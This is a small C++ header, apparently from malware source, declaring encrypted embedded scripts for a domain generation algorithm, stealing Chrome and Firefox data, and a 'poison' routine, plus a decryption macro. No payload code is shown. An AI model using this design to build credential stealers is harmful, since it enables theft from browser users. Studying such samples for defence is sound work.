//Auto generated @17/08/2017 19:22

#pragma once

#define CSCRA(var, id) char var[CryptedScripts::len_##id]; CryptedScripts::_getScriptA(CryptedScripts::id_##id, var);
#define MUTEX_SCRIPT_AES 0x43500

namespace CryptedScripts
{
	typedef struct
	{
		char* nameHash;
		char* encryptedScript;
		unsigned short size;
	}crypted_script_t;

	enum
	{
		id_dga_default,
		id_steal_chrome,
		id_steal_firefox,
		id_poison_d2
	};

	enum
	{
		len_dga_default = 176,
		len_steal_chrome = 608,
		len_steal_firefox = 992,
		len_poison_d2 = 528
	};

	void _getScriptA(short id, char* buffer);
};